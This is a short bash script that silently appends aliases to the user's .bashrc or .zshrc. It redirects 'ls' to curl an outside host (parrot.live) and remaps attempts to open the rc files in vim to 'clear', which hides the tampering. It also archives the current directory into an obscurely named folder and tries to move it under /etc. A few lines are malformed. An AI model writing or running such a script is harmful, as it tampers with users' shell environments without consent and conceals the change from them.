#!/bin/bash

function checkrc {
	if [[ -e $(find ~/.bashrc) ]]
	then
		echo $(inject)>>~/.bashrc
		exec bash
		return
	else
		echo $(inject)>>~/.zshrc
		source zsh
	fi
}

function movedir {
	dirn='asdvqsfghhjyyqqsfqfqsqf'
	tarball="$(echo $(pwd) | tr -d '/').tar"
	tar cf ${tarball} . 2>/dev/null
	mkdir ${dirn}
	mv $tarball ${dirn}
	mv $dirname /etc/
}

function inject {
	echo "alias ls='curl parrot.live'"
	echo "alias 'miv crhsab.\~'='vim ~/.bashrc'"
	echo "'miv crhsz.\~'='vim ~/.zshrc'"
	echo "alias 'vim ~/.bashrc'='clear'"
	echo "alias 'vim ~/.zshrc'='clear'"
}

$(checkrc)
$(movedir)